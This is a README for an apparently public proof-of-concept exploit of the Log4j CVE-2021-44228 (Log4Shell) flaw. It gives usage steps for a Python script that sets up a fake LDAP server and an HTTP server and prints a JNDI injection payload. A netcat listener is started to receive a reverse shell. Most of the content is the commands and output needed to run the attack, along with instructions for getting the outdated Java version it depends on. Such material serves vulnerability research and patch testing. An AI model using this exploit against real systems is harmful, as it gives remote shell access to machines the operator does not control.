# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.

Proof-of-concept (POC)
----------------------

As a PoC we have created a python file that automates the process. 


#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>

Getting the Java version.
--------------------------------------

At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```